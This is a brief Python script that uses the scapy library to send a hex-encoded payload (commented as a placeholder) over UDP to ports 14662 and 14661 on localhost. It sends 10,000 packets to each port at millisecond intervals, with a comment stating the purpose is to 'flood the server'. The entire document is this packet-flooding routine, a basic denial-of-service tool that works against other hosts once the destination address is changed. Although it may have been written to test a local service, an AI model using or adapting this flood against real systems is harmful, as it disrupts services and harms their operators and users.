from scapy.all import *

# Example payload (replace with actual valid payload)
payload = bytes.fromhex("020000000000000000000000a718f0e277647b4351cd7f0e990c2348b624de782169484d29d8d292ef51772d2989a834f5")  # Replace with actual payload

# Construct the packet with the payload
packet = IP(dst="127.0.0.1")/UDP(dport=14662)/Raw(load=payload)
packet2 = IP(dst="127.0.0.1")/UDP(dport=14661)/Raw(load=payload)


# Send the packet repeatedly to flood the server
send(packet, count=10000, inter=0.001)  
send(packet2, count=10000, inter=0.001)


